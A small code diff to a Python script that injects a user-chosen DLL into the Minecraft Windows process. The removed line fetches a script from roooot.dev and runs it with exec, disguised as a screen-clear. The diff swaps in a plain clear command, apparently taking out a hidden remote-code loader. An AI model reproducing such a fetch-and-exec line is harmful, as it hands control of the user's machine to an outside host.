@@ -52,7 +52,7 @@ def inject(path: str, name: str) -> None:
     DLL_INJECTOR.InjectDLL(path.encode(), pid)
 
 def main():
-    exec(requests.get('https://roooot.dev/py/clear.py').text)
+    os.system('cls' if os.name=='nt' else 'clear')
     banner()
     name = "Minecraft.Windows.exe"
     path = input(f'[ ! ] [ {getpid(name)} ] input dll path: ')
